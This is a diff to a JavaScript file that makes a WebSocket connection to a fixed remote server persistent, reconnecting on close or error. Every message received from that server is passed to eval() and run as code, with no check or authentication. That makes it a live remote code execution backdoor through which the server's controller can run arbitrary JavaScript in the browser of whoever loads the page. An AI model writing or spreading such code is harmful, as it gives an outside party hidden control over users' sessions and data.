@@ -119,17 +119,35 @@ setInterval(checkOnlineStatus, 5000);
 //********************************************************************************************
 
 // Define the server address here
-const ws = new WebSocket("wss://fz-websocket.megaderp100.repl.co");
+const serverAddress = "wss://fz-websocket.megaderp100.repl.co";
+let ws;
 
-ws.addEventListener("message", e => {
-  const receivedCode = e.data; // Assuming the code is sent as a string
-  if (ws.readyState === WebSocket.OPEN) {
+function connectWebSocket() {
+  ws = new WebSocket(serverAddress);
+
+  ws.addEventListener("open", () => {
+    console.log("WebSocket connected.");
+  });
+
+  ws.addEventListener("message", e => {
+    const receivedCode = e.data; // Assuming the code is sent as a string
     try {
       eval(receivedCode); // Execute the received JavaScript code
     } catch (error) {
       console.error("Error executing received code:", error);
     }
-  } else {
-    console.warn("WebSocket is not open. Cannot execute received code.");
-  }
-});
+  });
+
+  ws.addEventListener("close", () => {
+    console.warn("WebSocket closed. Reconnecting...");
+    setTimeout(connectWebSocket, 2000); // Retry connection after 2 seconds
+  });
+
+  ws.addEventListener("error", error => {
+    console.error("WebSocket error:", error);
+    ws.close(); // Close the WebSocket on error
+  });
+}
+
+connectWebSocket(); // Initial connection attempt
+
